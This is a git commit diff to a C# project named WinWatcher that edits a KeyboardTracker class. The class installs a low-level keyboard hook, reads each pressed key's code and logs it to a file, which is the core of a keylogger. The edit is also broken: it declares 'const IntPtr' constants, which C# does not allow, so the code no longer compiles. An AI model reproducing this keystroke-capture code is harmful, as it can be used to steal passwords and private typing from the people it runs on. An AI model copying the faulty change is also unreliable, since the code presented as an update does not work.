707fcc0c3aa8a694e4f987ab3809bb91925b1ae5
ssh4rky <sigmovic1488@gmail.com>
2026-04-26 10:42:45 +0300

    Version 1.3

--- WinWatcher/Entities/KeyboardTracker.cs
+++ WinWatcher/Entities/KeyboardTracker.cs
@@ -10,8 +10,8 @@ namespace WinWatcher.Entities
         private string logPath;
         private IntPtr hookId = IntPtr.Zero;
         private Action<string> onKeyPressed;
-        private const int WM_KEYDOWN = 0x0100;
-        private const int WM_SYSKEYDOWN = 0x0104;
+        private const IntPtr WM_KEYDOWN = 0x0100;
+        private const IntPtr WM_SYSKEYDOWN = 0x0104;
         public KeyboardTracker(string path, Action<string> keyCallback)
         {
             logPath = path;
@@ -43,7 +43,7 @@ namespace WinWatcher.Entities
         private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 &&
-                (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
+                (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
             {
                 int vkCode = Marshal.ReadInt32(lParam);
                 string key = ((Keys)vkCode).ToString();
